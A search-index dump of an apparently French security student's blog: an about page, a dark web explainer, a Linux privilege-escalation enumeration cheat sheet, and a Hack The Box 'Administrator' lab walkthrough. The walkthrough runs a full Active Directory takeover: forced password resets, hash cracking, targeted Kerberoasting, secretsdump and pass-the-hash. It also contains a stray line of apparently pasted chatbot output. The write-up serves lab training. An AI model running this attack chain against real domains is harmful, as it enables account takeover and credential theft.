{"config":{"indexing":"full","lang":["fr"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"A propos Comme beaucoup de personnes, j'ai cr\u00e9\u00e9 un blog. Mais pourquoi ? Tout simplement parce que je souhaitais un site web accessible, capable de vulgariser des sujets techniques sans les rendre ennuyeux, et qui pourrait aider d'autres personnes (\u00e9tudiants ou non) \u00e0 obtenir des informations utiles. Ce projet me permet \u00e9galement de progresser de mon cot\u00e9. Alors voila, je tente de m'organiser et vous partager mes connaissances sans partir dans tous les sens. Si vous \u00eates arriv\u00e9(e) ici par hasard, sachez que je ne pr\u00e9tends pas \u00eatre une encyclop\u00e9die. Je reste un novice en informatique. Heureusement, vous pouvez laisser des commentaires pour donner vos avis, compl\u00e9ter, critiquer (de mani\u00e8re constructive ou non), ou corriger mes articles. Qui suis-je Sur les internets, je m\u2019appelle Picsou, et je suis etudiant a l' Ecole2600 . Passionn\u00e9, je passe mes journ\u00e9es et mes nuits \u00e0 explorer divers sujets, qu'il s'agisse de s\u00e9curit\u00e9 informatique, de jeux vid\u00e9o, de high-tech, toujours curieux et d\u00e9sireux de partager mes d\u00e9couvertes. Je vous souhaite donc la bienvenue sur mon humble blog, et j\u2019esp\u00e8re que les articles que vous pourrez trouver vous seront utiles !","title":"Home"},{"location":"#a-propos","text":"Comme beaucoup de personnes, j'ai cr\u00e9\u00e9 un blog. Mais pourquoi ? Tout simplement parce que je souhaitais un site web accessible, capable de vulgariser des sujets techniques sans les rendre ennuyeux, et qui pourrait aider d'autres personnes (\u00e9tudiants ou non) \u00e0 obtenir des informations utiles. Ce projet me permet \u00e9galement de progresser de mon cot\u00e9. Alors voila, je tente de m'organiser et vous partager mes connaissances sans partir dans tous les sens. Si vous \u00eates arriv\u00e9(e) ici par hasard, sachez que je ne pr\u00e9tends pas \u00eatre une encyclop\u00e9die. Je reste un novice en informatique. Heureusement, vous pouvez laisser des commentaires pour donner vos avis, compl\u00e9ter, critiquer (de mani\u00e8re constructive ou non), ou corriger mes articles.","title":"A propos"},{"location":"#qui-suis-je","text":"Sur les internets, je m\u2019appelle Picsou, et je suis etudiant a l' Ecole2600 . Passionn\u00e9, je passe mes journ\u00e9es et mes nuits \u00e0 explorer divers sujets, qu'il s'agisse de s\u00e9curit\u00e9 informatique, de jeux vid\u00e9o, de high-tech, toujours curieux et d\u00e9sireux de partager mes d\u00e9couvertes. Je vous souhaite donc la bienvenue sur mon humble blog, et j\u2019esp\u00e8re que les articles que vous pourrez trouver vous seront utiles !","title":"Qui suis-je"},{"location":"Darknet/","text":"Cet article vise \u00e0 clarifier rapidement et simplement les concepts du deep web et du dark web. Beaucoup de gens me demandent si je suis d\u00e9j\u00e0 all\u00e9 sur ces trucs sans vraiment comprendre ce que c'est ni quelles sont les diff\u00e9rences. Cet article n'a pas pour but de faire une \u00e9tude approfondie, mais plut\u00f4t de donner une id\u00e9e claire et rapide de ce que signifient ces termes. Je propose donc quelques lignes pour expliquer en 5 minutes ce qu'impliquent ces termes. Deep Web Le deep web , ou web profond, est la partie \"cach\u00e9e\" d'Internet, \u00e0 opposer au web visible. Comme les deux s'opposent, expliquer l'un permet de comprendre l'autre. Web Visible Le web visible, c'est celui que l'utilisateur lambda conna\u00eet et parcourt. Ce sont toutes les pages web r\u00e9f\u00e9renc\u00e9es par les moteurs de recherche comme Yahoo, Google, Qwant, Bing, etc. Un moteur de recherche effectue par d\u00e9finition une recherche dans une base de donn\u00e9es qu'il a cr\u00e9\u00e9e en r\u00e9f\u00e9ren\u00e7ant des pages. Pour cela, il tente de trouver toutes les pages web possibles et essaie de comprendre leur contenu afin de les proposer \u00e0 l'utilisateur lors d'une recherche par mots-cl\u00e9s. Pendant longtemps, les moteurs de recherche ne comprenaient que les pages \u00e9crites en HTML (trouvables), donc ce n'\u00e9taient qu'elles qui \u00e9taient index\u00e9es. Mais avec le temps, ces moteurs parviennent \u00e0 comprendre d'autres types de fichiers comme les PDF, les documents Word, etc. Donc actuellement, quand vous faites une recherche sur un moteur de recherche classique, vous avez acc\u00e8s \u00e0 ces types de pages. Web Profond Cependant, il existe une multitude de pages ou documents que les moteurs de recherche classiques ne peuvent pas r\u00e9f\u00e9rencer, soit parce qu'ils n'ont tout simplement pas acc\u00e8s \u00e0 la page, soit parce qu'ils ne peuvent pas la comprendre . On trouve dans le lot les pages avec des liens dynamiques (qui changent en fonction de chaque utilisateur), celles prot\u00e9g\u00e9es par un mot de passe ou un captcha, les pages sur lesquelles aucun lien ne pointe, les documents non compris par les moteurs de recherche, ou encore les noms de domaines dont la r\u00e9solution DNS n'est pas standard, avec par exemple une racine qui n'est pas enregistr\u00e9e chez l\u2019 ICANN . J'entends par l\u00e0 que les racines de nom de domaine connues par l'ICANN sont les .com, .fr, .co, .gouv, etc., mais qu'il en existe des non standards, seulement accessibles via des serveurs DNS non standards. Un exemple connu est la racine .onion dont la r\u00e9solution n'est possible que via le r\u00e9seau TOR . Vous voyez, il existe de nombreux, tr\u00e8s nombreux cas pour lesquels les moteurs de recherche tels que nous les connaissons sont incapables d'indexer une ressource. Toutes ces ressources classiquement inaccessibles forment ce qu'on appelle le deep web . Dark Web Le dark web n\u2019est pas qualifi\u00e9 de \u00ab sombre \u00bb (dark) parce qu\u2019il est intrins\u00e8quement mauvais ; il est appel\u00e9 ainsi parce qu\u2019il offre de la confidentialit\u00e9, qui peut \u00eatre utilis\u00e9e \u00e0 bon ou \u00e0 mauvais escient. Une grande confusion existe entre le dark web et le deep web . Non , le dark web n'est pas le deep web . Le dark web est une partie du deep web . Le dark web repose sur les darknets , et un darknet n'est rien d'autre qu'un r\u00e9seau P2P ( peer-to-peer , ami-\u00e0-ami) dans lequel les utilisateurs sont consid\u00e9r\u00e9s comme des personnes de confiance, et les \u00e9changes sont anonymes, donc les IP ne sont pas publiquement partag\u00e9es. Un exemple connu de dark web est Freenet , qui n'est finalement rien de plus qu'un r\u00e9seau anonyme et distribu\u00e9 fond\u00e9 sur l'internet. Technologies Cl\u00e9s Tor (The Onion Router) : Utilise un syst\u00e8me de routage en oignon pour masquer l'adresse IP de l'utilisateur. Chaque n\u0153ud du r\u00e9seau ne conna\u00eet que l'adresse pr\u00e9c\u00e9dente et suivante, rendant la tra\u00e7abilit\u00e9 difficile. I2P (Invisible Internet Project) : Un r\u00e9seau anonyme qui permet des communications s\u00e9curis\u00e9es et anonymes. Freenet : Un r\u00e9seau d\u00e9centralis\u00e9 qui permet de publier et de stocker des informations de mani\u00e8re anonyme. Utilisations L\u00e9gitimes du Dark Web Le dark web n'est pas seulement utilis\u00e9 pour des activit\u00e9s ill\u00e9gales. Il offre \u00e9galement des avantages pour : Journalistes : Pour communiquer avec des sources de mani\u00e8re s\u00e9curis\u00e9e. Activistes : Pour organiser des mouvements dans des r\u00e9gimes oppressifs. Citoyens : Pour prot\u00e9ger leur vie priv\u00e9e contre la surveillance. confidentialit\u00e9 bien plus \u00e9lev\u00e9. Risques et S\u00e9curit\u00e9 Naviguer sur le dark web comporte des risques : Malware : Les sites peuvent contenir des logiciels malveillants. Escroqueries : Les transactions peuvent \u00eatre frauduleuses. Surveillance : Bien que l'anonymat soit un objectif, il n'est pas garanti. 'esp\u00e8re que ces explications vous ont aid\u00e9 \u00e0 mieux comprendre les diff\u00e9rences entre deep web et dark web. Il est crucial de ne pas confondre anonymat et ill\u00e9galit\u00e9 . Bien que les activit\u00e9s ill\u00e9gales cherchent souvent \u00e0 rester anonymes, l'inverse n'est pas toujours vrai. Nous avons parfaitement le droit de vouloir rester anonymes pour prot\u00e9ger notre vie priv\u00e9e et \u00e9viter la surveillance. Apr\u00e8s tout, l'anonymat, c'est la protection de la vie priv\u00e9e. Peut-\u00eatre qu'un prochain article pourrait vous guider sur la mani\u00e8re d'acc\u00e9der \u00e0 ces r\u00e9seaux dans les meilleures conditions ?","title":"Autres"},{"location":"Darknet/#deep-web","text":"Le deep web , ou web profond, est la partie \"cach\u00e9e\" d'Internet, \u00e0 opposer au web visible. Comme les deux s'opposent, expliquer l'un permet de comprendre l'autre.","title":"Deep Web"},{"location":"Darknet/#web-visible","text":"Le web visible, c'est celui que l'utilisateur lambda conna\u00eet et parcourt. Ce sont toutes les pages web r\u00e9f\u00e9renc\u00e9es par les moteurs de recherche comme Yahoo, Google, Qwant, Bing, etc. Un moteur de recherche effectue par d\u00e9finition une recherche dans une base de donn\u00e9es qu'il a cr\u00e9\u00e9e en r\u00e9f\u00e9ren\u00e7ant des pages. Pour cela, il tente de trouver toutes les pages web possibles et essaie de comprendre leur contenu afin de les proposer \u00e0 l'utilisateur lors d'une recherche par mots-cl\u00e9s. Pendant longtemps, les moteurs de recherche ne comprenaient que les pages \u00e9crites en HTML (trouvables), donc ce n'\u00e9taient qu'elles qui \u00e9taient index\u00e9es. Mais avec le temps, ces moteurs parviennent \u00e0 comprendre d'autres types de fichiers comme les PDF, les documents Word, etc. Donc actuellement, quand vous faites une recherche sur un moteur de recherche classique, vous avez acc\u00e8s \u00e0 ces types de pages.","title":"Web Visible"},{"location":"Darknet/#web-profond","text":"Cependant, il existe une multitude de pages ou documents que les moteurs de recherche classiques ne peuvent pas r\u00e9f\u00e9rencer, soit parce qu'ils n'ont tout simplement pas acc\u00e8s \u00e0 la page, soit parce qu'ils ne peuvent pas la comprendre . On trouve dans le lot les pages avec des liens dynamiques (qui changent en fonction de chaque utilisateur), celles prot\u00e9g\u00e9es par un mot de passe ou un captcha, les pages sur lesquelles aucun lien ne pointe, les documents non compris par les moteurs de recherche, ou encore les noms de domaines dont la r\u00e9solution DNS n'est pas standard, avec par exemple une racine qui n'est pas enregistr\u00e9e chez l\u2019 ICANN . J'entends par l\u00e0 que les racines de nom de domaine connues par l'ICANN sont les .com, .fr, .co, .gouv, etc., mais qu'il en existe des non standards, seulement accessibles via des serveurs DNS non standards. Un exemple connu est la racine .onion dont la r\u00e9solution n'est possible que via le r\u00e9seau TOR . Vous voyez, il existe de nombreux, tr\u00e8s nombreux cas pour lesquels les moteurs de recherche tels que nous les connaissons sont incapables d'indexer une ressource. Toutes ces ressources classiquement inaccessibles forment ce qu'on appelle le deep web .","title":"Web Profond"},{"location":"Darknet/#dark-web","text":"Le dark web n\u2019est pas qualifi\u00e9 de \u00ab sombre \u00bb (dark) parce qu\u2019il est intrins\u00e8quement mauvais ; il est appel\u00e9 ainsi parce qu\u2019il offre de la confidentialit\u00e9, qui peut \u00eatre utilis\u00e9e \u00e0 bon ou \u00e0 mauvais escient. Une grande confusion existe entre le dark web et le deep web . Non , le dark web n'est pas le deep web . Le dark web est une partie du deep web . Le dark web repose sur les darknets , et un darknet n'est rien d'autre qu'un r\u00e9seau P2P ( peer-to-peer , ami-\u00e0-ami) dans lequel les utilisateurs sont consid\u00e9r\u00e9s comme des personnes de confiance, et les \u00e9changes sont anonymes, donc les IP ne sont pas publiquement partag\u00e9es. Un exemple connu de dark web est Freenet , qui n'est finalement rien de plus qu'un r\u00e9seau anonyme et distribu\u00e9 fond\u00e9 sur l'internet.","title":"Dark Web"},{"location":"Darknet/#technologies-cles","text":"Tor (The Onion Router) : Utilise un syst\u00e8me de routage en oignon pour masquer l'adresse IP de l'utilisateur. Chaque n\u0153ud du r\u00e9seau ne conna\u00eet que l'adresse pr\u00e9c\u00e9dente et suivante, rendant la tra\u00e7abilit\u00e9 difficile. I2P (Invisible Internet Project) : Un r\u00e9seau anonyme qui permet des communications s\u00e9curis\u00e9es et anonymes. Freenet : Un r\u00e9seau d\u00e9centralis\u00e9 qui permet de publier et de stocker des informations de mani\u00e8re anonyme.","title":"Technologies Cl\u00e9s"},{"location":"Darknet/#utilisations-legitimes-du-dark-web","text":"Le dark web n'est pas seulement utilis\u00e9 pour des activit\u00e9s ill\u00e9gales. Il offre \u00e9galement des avantages pour : Journalistes : Pour communiquer avec des sources de mani\u00e8re s\u00e9curis\u00e9e. Activistes : Pour organiser des mouvements dans des r\u00e9gimes oppressifs. Citoyens : Pour prot\u00e9ger leur vie priv\u00e9e contre la surveillance. confidentialit\u00e9 bien plus \u00e9lev\u00e9.","title":"Utilisations L\u00e9gitimes du Dark Web"},{"location":"Darknet/#risques-et-securite","text":"Naviguer sur le dark web comporte des risques : Malware : Les sites peuvent contenir des logiciels malveillants. Escroqueries : Les transactions peuvent \u00eatre frauduleuses. Surveillance : Bien que l'anonymat soit un objectif, il n'est pas garanti. 'esp\u00e8re que ces explications vous ont aid\u00e9 \u00e0 mieux comprendre les diff\u00e9rences entre deep web et dark web. Il est crucial de ne pas confondre anonymat et ill\u00e9galit\u00e9 . Bien que les activit\u00e9s ill\u00e9gales cherchent souvent \u00e0 rester anonymes, l'inverse n'est pas toujours vrai. Nous avons parfaitement le droit de vouloir rester anonymes pour prot\u00e9ger notre vie priv\u00e9e et \u00e9viter la surveillance. Apr\u00e8s tout, l'anonymat, c'est la protection de la vie priv\u00e9e. Peut-\u00eatre qu'un prochain article pourrait vous guider sur la mani\u00e8re d'acc\u00e9der \u00e0 ces r\u00e9seaux dans les meilleures conditions ?","title":"Risques et S\u00e9curit\u00e9"},{"location":"PrivescLinux/","text":"Manuel Enumeration Informations Syst\u00e8me id : Affiche les informations sur l'utilisateur actuel. cat /etc/passwd : Affiche les informations sur les utilisateurs du syst\u00e8me. hostname : Affiche le nom d'h\u00f4te du syst\u00e8me. cat /etc/issue , cat /etc/os-release : Affiche des informations sur la version du syst\u00e8me d'exploitation. uname -a : Affiche toutes les informations sur le syst\u00e8me. Processus et R\u00e9seau ps aux : Affiche tous les processus en cours d'ex\u00e9cution. ss -anp : Affiche les connexions r\u00e9seau actives et les ports en \u00e9coute. netstat : Affiche les connexions r\u00e9seau, les tables de routage, les statistiques d'interface, etc. cat /etc/iptables/rules.v4 : Affiche les r\u00e8gles iptables pour IPv4. T\u00e2ches Planifi\u00e9es ls -lah /etc/cron* , crontab -l , grep \u201cCRON\u201d /var/log/syslog : Affiche les t\u00e2ches cron planifi\u00e9es. cat /etc/cron.hourly/* , /etc/cron.daily/* , /etc/cron.weekly/* , /etc/cron.monthly/* : Affiche les scripts cron planifi\u00e9s \u00e0 diff\u00e9rents intervalles. Applications et Modules dpkg -l : Liste toutes les applications install\u00e9es par dpkg. find / -writable -type d 2>/dev/null : Trouve les r\u00e9pertoires/fichiers accessibles en \u00e9criture. cat /etc/fstab : Liste tous les syst\u00e8mes de fichiers mont\u00e9s au d\u00e9marrage. mount : Liste tous les syst\u00e8mes de fichiers actuellement mont\u00e9s. lsblk : Affiche les disques disponibles. lsmod : Affiche les modules du noyau charg\u00e9s. modinfo <nom_du_module> : Affiche des informations sur un module du noyau sp\u00e9cifique (utilisez lsmod pour lister les modules). S\u00e9curit\u00e9 find / -perm -u=s -type f 2>/dev/null : Recherche les fichiers avec le bit SUID d\u00e9fini.","title":"Cheat Sheet"},{"location":"PrivescLinux/#manuel-enumeration","text":"","title":"Manuel Enumeration"},{"location":"PrivescLinux/#informations-systeme","text":"id : Affiche les informations sur l'utilisateur actuel. cat /etc/passwd : Affiche les informations sur les utilisateurs du syst\u00e8me. hostname : Affiche le nom d'h\u00f4te du syst\u00e8me. cat /etc/issue , cat /etc/os-release : Affiche des informations sur la version du syst\u00e8me d'exploitation. uname -a : Affiche toutes les informations sur le syst\u00e8me.","title":"Informations Syst\u00e8me"},{"location":"PrivescLinux/#processus-et-reseau","text":"ps aux : Affiche tous les processus en cours d'ex\u00e9cution. ss -anp : Affiche les connexions r\u00e9seau actives et les ports en \u00e9coute. netstat : Affiche les connexions r\u00e9seau, les tables de routage, les statistiques d'interface, etc. cat /etc/iptables/rules.v4 : Affiche les r\u00e8gles iptables pour IPv4.","title":"Processus et R\u00e9seau"},{"location":"PrivescLinux/#taches-planifiees","text":"ls -lah /etc/cron* , crontab -l , grep \u201cCRON\u201d /var/log/syslog : Affiche les t\u00e2ches cron planifi\u00e9es. cat /etc/cron.hourly/* , /etc/cron.daily/* , /etc/cron.weekly/* , /etc/cron.monthly/* : Affiche les scripts cron planifi\u00e9s \u00e0 diff\u00e9rents intervalles.","title":"T\u00e2ches Planifi\u00e9es"},{"location":"PrivescLinux/#applications-et-modules","text":"dpkg -l : Liste toutes les applications install\u00e9es par dpkg. find / -writable -type d 2>/dev/null : Trouve les r\u00e9pertoires/fichiers accessibles en \u00e9criture. cat /etc/fstab : Liste tous les syst\u00e8mes de fichiers mont\u00e9s au d\u00e9marrage. mount : Liste tous les syst\u00e8mes de fichiers actuellement mont\u00e9s. lsblk : Affiche les disques disponibles. lsmod : Affiche les modules du noyau charg\u00e9s. modinfo <nom_du_module> : Affiche des informations sur un module du noyau sp\u00e9cifique (utilisez lsmod pour lister les modules).","title":"Applications et Modules"},{"location":"PrivescLinux/#securite","text":"find / -perm -u=s -type f 2>/dev/null : Recherche les fichiers avec le bit SUID d\u00e9fini.","title":"S\u00e9curit\u00e9"},{"location":"ActiveDirectory/Introduction/","text":"On Progress","title":"Introduction"},{"location":"ActiveDirectory/Introduction/#on-progress","text":"","title":"On Progress"},{"location":"ActiveDirectory/Kerberos/","text":"Bientot","title":"Kerberos"},{"location":"ActiveDirectory/Kerberos/#bientot","text":"","title":"Bientot"},{"location":"Hack%20The%20Box/Administrator/","text":"\ud83e\udded \u00c9tape 1 : Collecte d\u2019informations (Reconnaissance) Outils utilis\u00e9s : nmap Commande : nmap -sC -sV -oN nmap.txt 10.10.11.42 Fichier txt : # Nmap 7.95 scan initiated Wed Apr 2 03:59:09 2025 as: /usr/lib/nmap/nmap -sC -sV -oN nmap.txt 10.10.11.42 Nmap scan report for 10.10.11.42 Host is up (0.024s latency). Not shown: 987 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-syst: |_ SYST: Windows_NT 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-04-02 14:59:18Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2025-04-02T14:59:21 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required |_clock-skew: 7h00m01s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Apr 2 03:59:28 2025 -- 1 IP address (1 host up) scanned in 18.16 seconds Explication : -sC : lance les scripts par d\u00e9faut (comme un petit scan de vuln\u00e9rabilit\u00e9s). -sV : d\u00e9tecte les versions des services. -oN nmap.txt : enregistre les r\u00e9sultats dans un fichier texte. 10.10.11.42 : IP de la machine (\u00e0 adapter selon ton instance HTB). R\u00e9sultat : Port Service Description 21 FTP Microsoft ftpd \u2013 souvent mal configur\u00e9 88 Kerberos Utilis\u00e9 pour l\u2019authentification AD 135 MSRPC Appels de proc\u00e9dure \u00e0 distance 139, 445 SMB Partages de fichiers \u2013 potentiellement juteux 389, 3268 LDAP Infos sur les utilisateurs/domaine via AD 5985 WinRM Interface d\u2019administration distante HTTP (PowerShell Remoting) \ud83d\udd10 Olivia On commence la box avec un petit cadeau du cr\u00e9ateur : les creds olivia : ichliebedich . Classique. Premier r\u00e9flexe : je tente un acc\u00e8s FTP vu qu\u2019il y a un port 21 qui tra\u00eene. Mais nop, c\u2019est mort direct : ftp 10.10.11.42 > login failed, home directory inaccessible Bon, pas grave. Je bascule sur le SMB et l\u00e0\u2026 bingo : crackmapexec smb 10.10.11.42 -u 'olivia' -p 'ichliebedich' --shares Et l\u00e0 je vois que les identifiants passent Mais pas de share super utile dispo (juste ADMIN$, IPC$, NETLOGON, SYSVOL\u2026). Rien \u00e0 loot pour l\u2019instant. Du coup je tente WinRM\u2026 et l\u00e0 : crackmapexec winrm 10.10.11.42 -u 'olivia' -p 'ichliebedich' Connexion directe avec Evil-WinRM : evil-winrm -i 10.10.11.42 -u 'olivia' -p 'ichliebedich' Une fois dans la session, je check rapidement les privil\u00e8ges : whoami /all \u2192 User basique, pas d\u2019acc\u00e8s admin mais quelques droits comme SeMachineAccountPrivilege . Rien de fou, mais je prends. Je liste aussi les users pr\u00e9sents sur la machine : net user Et l\u00e0 je vois pas mal de comptes int\u00e9ressants : administrator , alexander , benjamin , emily , ethan , michael , etc. Y\u2019a du monde sur ce domaine. Clairement un bon terrain pour lancer BloodHound et rep\u00e9rer une escalade possible \ud83c\udfaf Prise de contr\u00f4le de Michael \ud83e\udde0 Phase BloodHound \u00c0 ce stade, j\u2019suis connect\u00e9 avec Olivia, j\u2019ai pas de droits de fou, mais y\u2019a moyen de gratter. Je d\u00e9cide donc de sortir : BloodHound Je balance bloodhound.py pour collecter tout ce que je peux sur le domaine : bloodhound.py -d administrator.htb -ns 10.10.11.42 -u olivia -p ichliebedich -c All --zip Y\u2019a une erreur sur le ticket Kerberos, mais on s\u2019en fou, il repasse en NTLM derri\u00e8re. L\u2019important c\u2019est que la collecte passe nickel. \u00c0 la fin, \u00e7a me pond un .zip que j\u2019importe dans l\u2019interface BloodHound (via Neo4j, comme d\u2019hab). \ud83d\udd0d Analyse dans BloodHound Je check le node olivia , et l\u00e0 je vois un FDOC (First Degree Object Control) sur l\u2019utilisateur michael . Et plus pr\u00e9cis\u00e9ment, j\u2019ai un droit GenericAll sur lui. \ud83d\udd04 Changement de mot de passe Du coup, je reste dans ma session WinRM avec Olivia et je tape direct : net user michael michael /domain Yes sir Le mot de passe de michael est maintenant... michael . (Ouais j\u2019ai pas fait dans l\u2019originalit\u00e9, mais \u00e7a marche.) \u2705 V\u00e9rification Je teste le tout avec crackmapexec pour voir si les identifiants passent : crackmapexec smb 10.10.11.42 -u 'michael' -p 'michael' Et l\u00e0, le feu vert : [+] administrator.htb\\michael:michael Je viens officiellement de r\u00e9cup\u00e9rer un nouveau user. \ud83c\udfc6 Next stop \u2192 benjamin \ud83d\ude80 Parfait, voici la suite de ton write-up, toujours dans ton style familier et clair comme de l\u2019eau de roche \ud83d\ude0e\ud83d\udc47 \ud83d\udd10 Prise de contr\u00f4le de Benjamin Comme j\u2019ai encore BloodHound sous les yeux, je check le node de michael , histoire de voir s\u2019il peut m\u2019ouvrir d\u2019autres portes. Et boum : il a un FDOC sur benjamin avec le droit ForceChangePassword . \ud83e\udde0 Petit rappel : ForceChangePassword = je peux modifier le mot de passe d\u2019un user sans m\u00eame avoir besoin de l\u2019ancien . Ultra pratique. \ud83d\udd01 Reset du mot de passe via rpcclient J\u2019ai pas besoin de shell pour \u00e7a. Je passe direct par rpcclient : rpcclient -U michael 10.10.11.42 Une fois dedans, je balance : setuserinfo2 benjamin 23 'benjamin' \ud83e\udde0 Ici, 23 correspond au niveau de s\u00e9curit\u00e9 de l\u2019op\u00e9ration (set password). C\u2019est une vieille astuce avec rpcclient pour modifier un mot de passe d\u2019un user sans shell, juste via RPC. Je sors de rpcclient , et je teste les creds fra\u00eechement cr\u00e9\u00e9s : crackmapexec smb 10.10.11.42 -u 'benjamin' -p 'benjamin' Et l\u00e0, encore une fois, \u00e7a passe : [+] administrator.htb\\benjamin:benjamin \ud83d\udd13 Un compte de plus dans la poche ! \ud83d\udcc1 FTP avec Benjamin \u2013 Objectif : Emily Bon, je check vite fait sur BloodHound si benjamin a des droits int\u00e9ressants. Mais nada, il est tout claqu\u00e9. Par contre, je remarque qu\u2019il est membre du groupe Share Moderators , donc je tente sa connexion sur le FTP . ftp 10.10.11.42 Je tape les creds : benjamin / benjamin Et c'est carr\u00e9 je suis logg\u00e9 ! Je liste les fichiers : ftp> dir Et je vois un fichier qui attire direct mon attention : Backup.psafe3 Un fichier .psafe3 , donc un fichier Password Safe v3 \u2026 Y\u2019a des chances qu\u2019il contienne des creds. Je le t\u00e9l\u00e9charge : ftp 10.10.11.42 Connected to 10.10.11.42. 220 Microsoft FTP Service Name (10.10.11.42:kali): benjamin 331 Password required Password: 230 User logged in. Remote system type is Windows_NT. ftp> dir 229 Entering Extended Passive Mode (|||54017|) 125 Data connection already open; Transfer starting. 10-05-24 09:13AM 952 Backup.psafe3 226 Transfer complete. ftp> get Backup.psafe3 local: Backup.psafe3 remote: Backup.psafe3 229 Entering Extended Passive Mode (|||57645|) 125 Data connection already open; Transfer starting. 100% |*************************************************************************************************************************************************| 952 10.09 KiB/s 00:00 ETA 226 Transfer complete. WARNING! 3 bare linefeeds received in ASCII mode. File may not have transferred correctly. 952 bytes received in 00:00 (6.76 KiB/s) \ud83e\udde0 R\u00e9cup de Emily via Backup.psafe3 Je sais que c\u2019est un fichier Password Safe v3 , et \u00e7a veut souvent dire : y\u2019a des creds planqu\u00e9s dedans (en vrai je connaissais pas j'ai du chercher). Je tente un petit bruteforce avec hashcat (mode 5200) et le classique rockyou.txt : hashcat -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt Et l\u00e0 : Backup.psafe3:tekieromucho \u00c7a sent la vibe romantique ce mot de passe mdrrrr (J'ai leak parce que trop drole) \ud83d\udcca BloodHound : Objectif Ethan Je relance un petit tour dans BloodHound avec ce que j\u2019ai r\u00e9cup\u00e9r\u00e9. Et l\u00e0 je vois qu\u2019 Emily (dont on vient de r\u00e9cup\u00e9rer les creds gr\u00e2ce au fichier) a un GenericWrite sur l\u2019utilisateur ethan . \ud83e\udde0 Pour rappel : GenericWrite = je peux modifier les attributs du compte (genre, son SPN) \u2192 parfait pour un Kerberoasting . \ud83d\udd70\ufe0f Sync de l\u2019heure (Kerberos oblige) Avant toute chose, il faut sync sa machine avec l\u2019heure du DC, sinon Kerberos nous claque la porte au nez (Je parle d'experience j'me suis manger un Clock Skew ) : sudo ntpdate -u 10.10.11.42 \ud83d\udd25 Kerberoast Ethan Je balance un targeted kerberoast avec le user emily et son mot de passe ( tekieromucho ou ce qui en sort du fichier pwsafe d\u00e9crypt\u00e9) : python3 targetedKerberoast.py -d administrator.htb --dc-ip 10.10.11.42 -u emily -p 'UXLCI5iETUsIBoFVTj8y*****' Et l\u00e0 je r\u00e9cup\u00e8re un beau gros hash bien juteux Je le crack avec hashcat (mode 13100) : hashcat -m 13100 ethan.hash /usr/share/wordlists/rockyou.txt Et... limpb..... en mot de passe. OK. \ud83e\uddea Dump total avec secretsdump.py Je tente direct la totale avec secretsdump.py : python3 secretsdump.py administrator.htb/ethan:limpb****@10.10.11.42 \ud83e\udde0 Gr\u00e2ce \u00e0 ce compte, j\u2019ai acc\u00e8s \u00e0 la r\u00e9plication AD (via DRSUAPI), ce qui me permet de r\u00e9cup\u00e9rer tous les secrets du domaine , y compris les hash NTLM de tous les comptes \u2014 m\u00eame celui d\u2019Administrator . Et l\u00e0... C\u2019est No\u00ebl \ud83c\udf81 Je r\u00e9cup\u00e8re le hash NTLM de Administrator : Administrator:500:...:3dc553ce4b9fd20bd016e098******::: \ud83c\udfc1 Prise de contr\u00f4le finale \u2013 Administrator Je peux maintenant me connecter avec Evil-WinRM : evil-winrm -i 10.10.11.42 -u Administrator -H 3dc553ce4b9fd20bd016e098****** Shell Admin. Et la, c'est la fin Et pour les puristes, je sors aussi l\u2019artillerie old school : psexec.py administrator.htb/Administrator@10.10.11.42 -hashes :3dc553ce4b9fd20bd016e098****** \u2192 SYSTEM, baby. \ud83e\udde9 R\u00e9sum\u00e9 des users / creds Utilisateur Acc\u00e8s / Mot de passe Comment ? olivia ichliebedich fourni au d\u00e9but michael michael reset via GenericAll (BloodHound) benjamin benjamin ForceChangePassword via michael emily UXLCI5... / depuis .psafe3 fichier FTP crack\u00e9 ethan limpb**** Kerberoasting depuis Emily Administrator hash NTLM secretsdump avec ethan","title":"Administrator"},{"location":"Hack%20The%20Box/Administrator/#etape-1-collecte-dinformations-reconnaissance","text":"Outils utilis\u00e9s : nmap","title":"\ud83e\udded \u00c9tape 1 : Collecte d\u2019informations (Reconnaissance)"},{"location":"Hack%20The%20Box/Administrator/#commande","text":"nmap -sC -sV -oN nmap.txt 10.10.11.42 Fichier txt : # Nmap 7.95 scan initiated Wed Apr 2 03:59:09 2025 as: /usr/lib/nmap/nmap -sC -sV -oN nmap.txt 10.10.11.42 Nmap scan report for 10.10.11.42 Host is up (0.024s latency). Not shown: 987 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-syst: |_ SYST: Windows_NT 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-04-02 14:59:18Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2025-04-02T14:59:21 |_ start_date: N/A | smb2-security-mode: | 